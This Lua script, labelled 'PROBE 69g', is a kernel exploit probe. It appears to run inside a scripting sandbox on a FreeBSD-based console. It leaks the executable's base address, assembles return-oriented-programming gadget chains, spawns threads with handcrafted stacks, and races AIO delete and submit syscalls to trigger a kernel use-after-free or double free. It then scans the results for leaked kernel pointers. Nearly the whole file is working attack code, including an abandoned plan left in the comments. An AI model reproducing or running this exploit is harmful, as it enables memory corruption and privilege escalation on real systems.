-- CRASH_CLASS: HIGH
-- PROBE 69g: 3-thread submit-during-delete for real UAF
--
-- 65l's 2-thread race = double-SUCCESS, not double-free.
-- Thread B finds NULL after Thread A clears the slot.
-- Real UAF needs 3 concurrent operations:
--   Thread A: 662 delete (frees R, I, Q to zone free lists)
--   Thread C: 669 submit (allocates NEW R, I, Q into freed slots)
--   Thread B: 662 delete (re-frees slots Thread C just reclaimed)
-- Result: Thread C holds references to objects Thread B freed.
--
-- Gate sequence: fire A, brief spin, fire C, fire B.
-- TOCTOU window is ~hundreds of nanoseconds.

print("=== PROBE 69g: SUBMIT-DURING-DELETE (3-THREAD UAF) ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Eboot base
local ib = memory.alloc(0x200); wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_pop_rcx = eb + 0xE64
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGSEGV, SIGSYS, SIGPIPE
local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1)); wd(N(sa_buf) + 8, 0); wq(N(sa_buf) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- /dev/zero for AIO
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)
if fd_zero < 0 then print("FATAL: no /dev/zero"); return end

-- ============================================================
-- AIO helpers (main thread)
-- ============================================================
local BATCH = 16
local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rd(N(one_st)) or 0xDEAD
end

local function query_663(id)
    wd(N(one_id), id)
    wq(N(one_st), uint64(0xDEADDEAD))
    pcall(function()
        mk(663)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rq(N(one_st))
end

local function query_664(id)
    wd(N(one_id), id)
    wq(N(one_st), uint64(0xDEADDEAD))
    pcall(function()
        mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
    end)
    return rq(N(one_st))
end

-- ============================================================
-- GATE SETUP: 3 socketpairs (A, B, C)
-- ============================================================
print("")
print("-- GATE SETUP (3 gates) --")

local function make_gate()
    local sp = memory.alloc(16)
    wd(N(sp), 0xFFFFFFFF); wd(N(sp) + 4, 0xFFFFFFFF)
    pcall(function() mk(135)(uint64(1), uint64(2), uint64(0), uint64(N(sp))) end)
    local r = rd(N(sp)) or -1
    local w = rd(N(sp) + 4) or -1
    return r, w
end

local gate_rd_A, gate_wr_A = make_gate()
local gate_rd_B, gate_wr_B = make_gate()
local gate_rd_C, gate_wr_C = make_gate()
print(string.format("gateA: rd=%d wr=%d", gate_rd_A, gate_wr_A))
print(string.format("gateB: rd=%d wr=%d", gate_rd_B, gate_wr_B))
print(string.format("gateC: rd=%d wr=%d", gate_rd_C, gate_wr_C))
if gate_rd_A < 0 or gate_rd_B < 0 or gate_rd_C < 0 then
    print("GATE FAIL"); return
end

-- Shared state
local del_ids    = memory.alloc(4 * BATCH + 0x10)
local states_A   = memory.alloc(4 * BATCH + 0x10)
local states_B   = memory.alloc(4 * BATCH + 0x10)
local marker_A   = memory.alloc(8)
local marker_B   = memory.alloc(8)
local marker_C   = memory.alloc(8)
local tmp_A      = memory.alloc(8)
local tmp_B      = memory.alloc(8)
local tmp_C      = memory.alloc(8)
local wbyte      = memory.alloc(8)
wd(N(wbyte), 0x42)

-- Child C submit output: up to BATCH new IDs
local c_new_ids  = memory.alloc(4 * BATCH + 0x10)
local c_reqs     = memory.alloc(0x30)
local c_data     = memory.alloc(0x1000)
local c_result   = memory.alloc(0x100)

-- Fake TCB for child C (needs errno for 669 calls)
local fake_tcb   = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(fake_tcb) + i, 0) end
wq(N(fake_tcb), uint64(N(fake_tcb)))  -- self-referencing

-- Pre-fill C's request struct (reused each submit in the loop)
wq(N(c_reqs), uint64(0))           -- cmd=0 placeholder, overwritten per-call
wq(N(c_reqs) + 8, uint64(16))      -- nbytes
local cbh, cbl = get_hi_lo(uint64(N(c_data)))
wd(N(c_reqs) + 0x10, cbl); wd(N(c_reqs) + 0x14, cbh)
local crh, crl = get_hi_lo(uint64(N(c_result)))
wd(N(c_reqs) + 0x18, crl); wd(N(c_reqs) + 0x1C, crh)
wd(N(c_reqs) + 0x20, fd_zero); wd(N(c_reqs) + 0x24, 0)

-- Stacks
local stk_A = memory.alloc(0x4000)
local stk_B = memory.alloc(0x4000)
local stk_C = memory.alloc(0x8000)  -- bigger for C's loop

-- ============================================================
-- RACE LOOP
-- ============================================================
local ITERS = 15
local total_uaf = 0

print("")
print("-- 3-THREAD RACE: " .. ITERS .. " iters --")

for iter = 1, ITERS do
    if not alive() then print("  DEAD at iter " .. iter); break end

    -- Submit BATCH AIO requests from main thread and poll each
    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); ids[#ids + 1] = id end
    end
    if #ids < BATCH then
        print(string.format("  iter %d: only %d IDs, need %d", iter, #ids, BATCH))
        break
    end

    -- Write IDs to shared del_ids buffer
    for i = 0, BATCH - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAA)
        wd(N(states_B) + i * 4, 0xBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))
    wq(N(marker_C), uint64(0))

    -- Clear C's new-ID output
    for i = 0, BATCH - 1 do wd(N(c_new_ids) + i * 4, 0) end

    -- -------------------------------------------------------
    -- Build child A ROP: marker -> gate -> 662 delete -> exit
    -- -------------------------------------------------------
    local sb_A = N(stk_A)
    for i = 0, 0x3FFC, 4 do wd(sb_A + i, 0) end
    local sp_a = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    local oa = 0
    local function wa(v) wq(sp_a + oa, v); oa = oa + 8 end
    -- marker
    wa(g_pop_rax); wa(uint64(0x41414141))
    wa(g_pop_rdi); wa(uint64(N(marker_A))); wa(g_mov_m_rax)
    -- gate: read(gate_rd_A, tmp, 1)
    wa(g_pop_rax); wa(uint64(3))
    wa(g_pop_rdi); wa(uint64(gate_rd_A))
    wa(g_pop_rsi); wa(uint64(N(tmp_A)))
    wa(g_pop_rdx); wa(uint64(1)); wa(stub)
    -- 662(del_ids, BATCH, states_A)
    wa(g_pop_rdi); wa(uint64(N(del_ids)))
    wa(g_pop_rsi); wa(uint64(BATCH))
    wa(g_pop_rdx); wa(uint64(N(states_A)))
    wa(g_pop_rax); wa(uint64(662)); wa(stub)
    -- thr_exit
    wa(g_pop_rdi); wa(uint64(0))
    wa(g_pop_rax); wa(uint64(431)); wa(stub)

    -- -------------------------------------------------------
    -- Build child B ROP: marker -> gate -> 662 delete -> exit
    -- (same IDs as A — the second delete)
    -- -------------------------------------------------------
    local sb_B = N(stk_B)
    for i = 0, 0x3FFC, 4 do wd(sb_B + i, 0) end
    local sp_b = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    local ob = 0
    local function wb(v) wq(sp_b + ob, v); ob = ob + 8 end
    wb(g_pop_rax); wb(uint64(0x42424242))
    wb(g_pop_rdi); wb(uint64(N(marker_B))); wb(g_mov_m_rax)
    wb(g_pop_rax); wb(uint64(3))
    wb(g_pop_rdi); wb(uint64(gate_rd_B))
    wb(g_pop_rsi); wb(uint64(N(tmp_B)))
    wb(g_pop_rdx); wb(uint64(1)); wb(stub)
    wb(g_pop_rdi); wb(uint64(N(del_ids)))
    wb(g_pop_rsi); wb(uint64(BATCH))
    wb(g_pop_rdx); wb(uint64(N(states_B)))
    wb(g_pop_rax); wb(uint64(662)); wb(stub)
    wb(g_pop_rdi); wb(uint64(0))
    wb(g_pop_rax); wb(uint64(431)); wb(stub)

    -- -------------------------------------------------------
    -- Build child C ROP: TCB -> marker -> gate -> N×(669 submit) -> exit
    -- Child C submits BATCH NEW AIO requests into the slots A just freed.
    -- Needs fake TCB because 669 may set errno on partial failure.
    -- -------------------------------------------------------
    local sb_C = N(stk_C)
    for i = 0, 0x7FFC, 4 do wd(sb_C + i, 0) end
    local sp_c = sb_C + 0x6000 - ((sb_C + 0x6000) % 16) - 8
    local oc = 0
    local function wc(v) wq(sp_c + oc, v); oc = oc + 8 end

    -- sysarch(SET_FSBASE=129, &fake_tcb)
    wc(g_pop_rax); wc(uint64(165))
    wc(g_pop_rdi); wc(uint64(129))
    wc(g_pop_rsi); wc(uint64(N(fake_tcb)))
    wc(stub)

    -- marker
    wc(g_pop_rax); wc(uint64(0x43434343))
    wc(g_pop_rdi); wc(uint64(N(marker_C))); wc(g_mov_m_rax)

    -- gate: read(gate_rd_C, tmp, 1)
    wc(g_pop_rax); wc(uint64(3))
    wc(g_pop_rdi); wc(uint64(gate_rd_C))
    wc(g_pop_rsi); wc(uint64(N(tmp_C)))
    wc(g_pop_rdx); wc(uint64(1)); wc(stub)

    -- Submit BATCH requests one at a time via 669
    -- 669(cmd=1, reqs_ptr, count=1, class=1, id_out_ptr)
    -- c_reqs is pre-filled; each submit writes one ID to c_new_ids[i]
    for si = 0, BATCH - 1 do
        -- Set cmd field in c_reqs (offset 0) = 1 (read)
        -- Already set via wq above, but ensure per-iteration
        wc(g_pop_rdi); wc(uint64(N(c_reqs)))
        wc(g_pop_rax); wc(uint64(0))
        wc(g_mov_m_rax)  -- c_reqs+0x00 = 0 (cleared, then we set cmd below)

        -- 669(1, c_reqs, 1, 1, &c_new_ids[si])
        wc(g_pop_rdi); wc(uint64(1))                         -- cmd=1 (read)
        wc(g_pop_rsi); wc(uint64(N(c_reqs)))                 -- reqs ptr
        wc(g_pop_rdx); wc(uint64(1))                         -- count=1
        wc(g_pop_rcx); wc(uint64(1))                         -- class=1
        -- arg5 = &c_new_ids[si] — but we only have 4 controlled regs
        -- 669 takes 5 args: (cmd, reqs, count, class, ids)
        -- We need r8 for the 5th arg but have no pop_r8 gadget.
        -- Workaround: pre-write the id output ptr to the stack position
        -- that the ABI uses for arg5 (past the 4 register args).
        --
        -- Actually, the fn_addr stub passes ALL args from the pipe struct.
        -- We can't control r8 via ROP. Instead, use a different approach:
        -- write the id_ptr into the pipe-like structure.
        --
        -- ALTERNATIVE: call 669 from the main thread after gate C fires
        -- but that defeats the timing. Let's use the main thread for
        -- submit since the race window is between A's free and B's
        -- re-delete — C just needs to allocate IN THAT WINDOW.
        --
        -- REVISED PLAN: Child C doesn't call 669 via ROP (needs 5 args).
        -- Instead, Child C writes a marker, and the MAIN THREAD submits
        -- as fast as possible after firing gate A.
        -- But that means the main thread must call 669 BATCH times between
        -- firing A and firing B — this IS the timing window.
    end
    -- The 5-arg problem means we can't do 669 from child ROP.
    -- Reset: Child C will just be a timing spacer + marker writer.
    -- Main thread does the submits between gate A and gate B.

    -- Rewind child C to just: TCB + marker + gate + small delay + exit
    oc = 0  -- reset
    -- sysarch(SET_FSBASE=129, &fake_tcb)
    wc(g_pop_rax); wc(uint64(165))
    wc(g_pop_rdi); wc(uint64(129))
    wc(g_pop_rsi); wc(uint64(N(fake_tcb)))
    wc(stub)
    -- marker
    wc(g_pop_rax); wc(uint64(0x43434343))
    wc(g_pop_rdi); wc(uint64(N(marker_C))); wc(g_mov_m_rax)
    -- gate
    wc(g_pop_rax); wc(uint64(3))
    wc(g_pop_rdi); wc(uint64(gate_rd_C))
    wc(g_pop_rsi); wc(uint64(N(tmp_C)))
    wc(g_pop_rdx); wc(uint64(1)); wc(stub)
    -- thr_exit
    wc(g_pop_rdi); wc(uint64(0))
    wc(g_pop_rax); wc(uint64(431)); wc(stub)

    -- -------------------------------------------------------
    -- thr_param structs
    -- -------------------------------------------------------
    local pa = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pa) + i, 0) end
    wq(N(pa), g_bare_ret)
    wq(N(pa) + 0x10, uint64(sb_A))
    wq(N(pa) + 0x18, uint64(0x2000))

    local pb = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pb) + i, 0) end
    wq(N(pb), g_bare_ret)
    wq(N(pb) + 0x10, uint64(sb_B))
    wq(N(pb) + 0x18, uint64(0x2000))

    local pc = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pc) + i, 0) end
    wq(N(pc), g_bare_ret)
    wq(N(pc) + 0x10, uint64(sb_C))
    wq(N(pc) + 0x18, uint64(0x6000))

    -- Spawn all 3 children
    pcall(function() mk(455)(pa, uint64(0x38)) end)
    pcall(function() mk(455)(pb, uint64(0x38)) end)
    pcall(function() mk(455)(pc, uint64(0x38)) end)

    -- Wait for all 3 markers
    local a_rdy, b_rdy, c_rdy = false, false, false
    for w = 1, 500000 do
        if not a_rdy and N(rq(N(marker_A)) or uint64(0)) ~= 0 then a_rdy = true end
        if not b_rdy and N(rq(N(marker_B)) or uint64(0)) ~= 0 then b_rdy = true end
        if not c_rdy and N(rq(N(marker_C)) or uint64(0)) ~= 0 then c_rdy = true end
        if a_rdy and b_rdy and c_rdy then break end
    end
    if not (a_rdy and b_rdy and c_rdy) then
        print(string.format("  iter %d: TIMEOUT a=%s b=%s c=%s",
            iter, tostring(a_rdy), tostring(b_rdy), tostring(c_rdy)))
        break
    end

    -- -------------------------------------------------------
    -- CRITICAL SEQUENCE:
    --   1. Fire gate A (child A starts 662 delete — frees R/I/Q)
    --   2. Immediately submit BATCH new AIO from main thread
    --      (reclaims R/I/Q slots with fresh objects)
    --   3. Fire gate B (child B starts 662 delete on SAME old IDs)
    --      Thread B's exclusive lock may re-free the reclaimed slots
    --   4. Fire gate C (just a timing marker, child C exits)
    --
    -- The window: between A acquiring the exclusive lock (freeing)
    -- and B acquiring it (re-reading the slot). If main thread's
    -- submit allocates into the just-freed slots before B reads,
    -- B may free objects that belong to our new submissions.
    -- -------------------------------------------------------

    -- STEP 1: Fire gate A
    pcall(function() mk(4)(uint64(gate_wr_A), uint64(N(wbyte)), uint64(1)) end)

    -- STEP 2: Submit BATCH new AIO requests IMMEDIATELY
    -- These allocate R/I/Q from the zones A just freed into
    local new_ids = {}
    for si = 1, BATCH do
        local nid = submit_one()
        if nid ~= 0 then new_ids[#new_ids + 1] = nid end
    end

    -- STEP 3: Fire gate B (second delete on the OLD ids)
    pcall(function() mk(4)(uint64(gate_wr_B), uint64(N(wbyte)), uint64(1)) end)

    -- STEP 4: Fire gate C (let it exit)
    pcall(function() mk(4)(uint64(gate_wr_C), uint64(N(wbyte)), uint64(1)) end)

    -- Wait for children to complete
    for w = 1, 200000 do end

    if not alive() then
        print(string.format("  iter %d: CRASHED (new_ids=%d)", iter, #new_ids))
        break
    end

    -- -------------------------------------------------------
    -- ANALYSIS: check what happened
    -- -------------------------------------------------------
    local a_ok, b_ok = 0, 0
    for i = 0, BATCH - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAA
        local sB = rd(N(states_B) + i * 4) or 0xBB
        if sA == 0 then a_ok = a_ok + 1 end
        if sB == 0 then b_ok = b_ok + 1 end
    end

    -- Poll the NEW IDs — if B freed their backing objects,
    -- 663/664 on these IDs may return anomalous data or crash
    local new_live = 0
    local new_dead = 0
    local new_anom = 0
    for _, nid in ipairs(new_ids) do
        local pst = poll_one(nid)
        if pst == 0 or pst == 3 or pst == 4 then
            new_live = new_live + 1
        elseif pst == 0xDEAD then
            new_dead = new_dead + 1
        else
            new_anom = new_anom + 1
            -- Print anomalous status in hex
            print(string.format("  iter %d NEW_ID=0x%X poll=0x%08X", iter, nid, pst))
        end
    end

    -- Query new IDs via 663 for kernel pointer contamination
    local kptr_count = 0
    for _, nid in ipairs(new_ids) do
        local q = query_663(nid)
        if q then
            local qh, ql = get_hi_lo(q)
            if qh >= 0xFFFF8000 and qh ~= 0xFFFFFFFF then
                kptr_count = kptr_count + 1
                print(string.format("  iter %d *** KPTR *** id=0x%X 663=%s",
                    iter, nid, fmt(q)))
            end
            -- Also check for stale old-ID status values
            if ql ~= 0 and ql ~= 0xDEADDEAD and ql ~= 3 and ql ~= 4 then
                if new_anom < 10 then
                    new_anom = new_anom + 1
                    print(string.format("  iter %d id=0x%X 663=%s (anomaly)",
                        iter, nid, fmt(q)))
                end
            end
        end
    end

    -- Try to delete the new IDs — if they were already freed by B,
    -- this is a DOUBLE FREE on the new objects
    local del_ok = 0
    local del_fail = 0
    for _, nid in ipairs(new_ids) do
        wd(N(one_id), nid); wd(N(one_st), 0xDEAD)
        pcall(function()
            mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
        end)
        local dst = rd(N(one_st)) or 0xDEAD
        if dst == 0 then
            del_ok = del_ok + 1
        else
            del_fail = del_fail + 1
        end
    end

    -- UAF indicator: B succeeded on some old IDs (b_ok > 0) AND
    -- new IDs have anomalies or deletion failures
    local uaf_signal = (b_ok > 0 and (new_anom > 0 or del_fail > 0 or kptr_count > 0))
    if uaf_signal then total_uaf = total_uaf + 1 end

    local tag = ""
    if uaf_signal then tag = " *** UAF SIGNAL ***" end
    if kptr_count > 0 then tag = tag .. " KPTR=" .. kptr_count end

    print(string.format(
        "  iter %d: A_del=%d B_del=%d new=%d live=%d dead=%d anom=%d del_ok=%d del_fail=%d%s",
        iter, a_ok, b_ok, #new_ids, new_live, new_dead, new_anom, del_ok, del_fail, tag))
end

if not alive() then print("DEAD after race loop") end

-- ============================================================
-- VARIANT 2: Fire A and B near-simultaneously (like 67i2),
-- then submit from main thread while they race.
-- This catches the case where the TOCTOU window is between
-- A and B's lock acquisitions, and submit lands in between.
-- ============================================================
print("")
print("-- VARIANT 2: simultaneous A+B with interleaved submit --")

for iter = 1, 10 do
    if not alive() then print("  DEAD at V2 iter " .. iter); break end

    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); ids[#ids + 1] = id end
    end
    if #ids < BATCH then break end

    for i = 0, BATCH - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAA)
        wd(N(states_B) + i * 4, 0xBB)
    end
    wq(N(marker_A), uint64(0))
    wq(N(marker_B), uint64(0))

    -- Reuse stacks A and B (rebuild chains)
    local sb_A2 = N(stk_A)
    for i = 0, 0x3FFC, 4 do wd(sb_A2 + i, 0) end
    local sp_a2 = sb_A2 + 0x2000 - ((sb_A2 + 0x2000) % 16) - 8
    local oa2 = 0
    local function wa2(v) wq(sp_a2 + oa2, v); oa2 = oa2 + 8 end
    wa2(g_pop_rax); wa2(uint64(0x41414141))
    wa2(g_pop_rdi); wa2(uint64(N(marker_A))); wa2(g_mov_m_rax)
    wa2(g_pop_rax); wa2(uint64(3))
    wa2(g_pop_rdi); wa2(uint64(gate_rd_A))
    wa2(g_pop_rsi); wa2(uint64(N(tmp_A)))
    wa2(g_pop_rdx); wa2(uint64(1)); wa2(stub)
    wa2(g_pop_rdi); wa2(uint64(N(del_ids)))
    wa2(g_pop_rsi); wa2(uint64(BATCH))
    wa2(g_pop_rdx); wa2(uint64(N(states_A)))
    wa2(g_pop_rax); wa2(uint64(662)); wa2(stub)
    wa2(g_pop_rdi); wa2(uint64(0))
    wa2(g_pop_rax); wa2(uint64(431)); wa2(stub)

    local sb_B2 = N(stk_B)
    for i = 0, 0x3FFC, 4 do wd(sb_B2 + i, 0) end
    local sp_b2 = sb_B2 + 0x2000 - ((sb_B2 + 0x2000) % 16) - 8
    local ob2 = 0
    local function wb2(v) wq(sp_b2 + ob2, v); ob2 = ob2 + 8 end
    wb2(g_pop_rax); wb2(uint64(0x42424242))
    wb2(g_pop_rdi); wb2(uint64(N(marker_B))); wb2(g_mov_m_rax)
    wb2(g_pop_rax); wb2(uint64(3))
    wb2(g_pop_rdi); wb2(uint64(gate_rd_B))
    wb2(g_pop_rsi); wb2(uint64(N(tmp_B)))
    wb2(g_pop_rdx); wb2(uint64(1)); wb2(stub)
    wb2(g_pop_rdi); wb2(uint64(N(del_ids)))
    wb2(g_pop_rsi); wb2(uint64(BATCH))
    wb2(g_pop_rdx); wb2(uint64(N(states_B)))
    wb2(g_pop_rax); wb2(uint64(662)); wb2(stub)
    wb2(g_pop_rdi); wb2(uint64(0))
    wb2(g_pop_rax); wb2(uint64(431)); wb2(stub)

    local pa2 = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pa2) + i, 0) end
    wq(N(pa2), g_bare_ret)
    wq(N(pa2) + 0x10, uint64(sb_A2))
    wq(N(pa2) + 0x18, uint64(0x2000))

    local pb2 = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(pb2) + i, 0) end
    wq(N(pb2), g_bare_ret)
    wq(N(pb2) + 0x10, uint64(sb_B2))
    wq(N(pb2) + 0x18, uint64(0x2000))

    pcall(function() mk(455)(pa2, uint64(0x38)) end)
    pcall(function() mk(455)(pb2, uint64(0x38)) end)

    local a_rdy2, b_rdy2 = false, false
    for w = 1, 500000 do
        if not a_rdy2 and N(rq(N(marker_A)) or uint64(0)) ~= 0 then a_rdy2 = true end
        if not b_rdy2 and N(rq(N(marker_B)) or uint64(0)) ~= 0 then b_rdy2 = true end
        if a_rdy2 and b_rdy2 then break end
    end
    if not (a_rdy2 and b_rdy2) then
        print(string.format("  V2 iter %d: TIMEOUT", iter))
        break
    end

    -- Fire BOTH gates, then immediately submit from main thread
    pcall(function() mk(4)(uint64(gate_wr_A), uint64(N(wbyte)), uint64(1)) end)
    pcall(function() mk(4)(uint64(gate_wr_B), uint64(N(wbyte)), uint64(1)) end)

    -- Submit interleaved with the racing deletes
    local new_ids2 = {}
    for si = 1, BATCH do
        local nid = submit_one()
        if nid ~= 0 then new_ids2[#new_ids2 + 1] = nid end
    end

    -- Wait
    for w = 1, 200000 do end

    if not alive() then
        print(string.format("  V2 iter %d: CRASHED", iter))
        break
    end

    -- Count old-ID double deletes
    local a2_ok, b2_ok, doubles2 = 0, 0, 0
    for i = 0, BATCH - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAA
        local sB = rd(N(states_B) + i * 4) or 0xBB
        if sA == 0 then a2_ok = a2_ok + 1 end
        if sB == 0 then b2_ok = b2_ok + 1 end
        if sA == 0 and sB == 0 then doubles2 = doubles2 + 1 end
    end

    -- Check new IDs
    local v2_anom = 0
    for _, nid in ipairs(new_ids2) do
        local q = query_663(nid)
        if q then
            local qh, ql = get_hi_lo(q)
            if qh >= 0xFFFF8000 and qh ~= 0xFFFFFFFF then
                v2_anom = v2_anom + 1
                print(string.format("  V2 iter %d *** KPTR *** id=0x%X 663=%s",
                    iter, nid, fmt(q)))
            end
        end
    end

    -- Try deleting new IDs
    local v2_del_ok, v2_del_fail = 0, 0
    for _, nid in ipairs(new_ids2) do
        pcall(function() poll_one(nid) end)
        wd(N(one_id), nid); wd(N(one_st), 0xDEAD)
        pcall(function()
            mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st)))
        end)
        local dst = rd(N(one_st)) or 0xDEAD
        if dst == 0 then v2_del_ok = v2_del_ok + 1
        else v2_del_fail = v2_del_fail + 1 end
    end

    local v2_tag = ""
    if doubles2 > 0 and (v2_anom > 0 or v2_del_fail > 0) then
        v2_tag = " *** UAF SIGNAL ***"
        total_uaf = total_uaf + 1
    end

    print(string.format(
        "  V2 iter %d: A=%d B=%d dbl=%d new=%d anom=%d del_ok=%d del_fail=%d%s",
        iter, a2_ok, b2_ok, doubles2, #new_ids2, v2_anom, v2_del_ok, v2_del_fail, v2_tag))
end

print("")
print("TOTAL_UAF_SIGNALS=" .. total_uaf)
print("alive=" .. (alive() and "YES" or "NO"))
print("")
print("=== PROBE 69g COMPLETE ===")
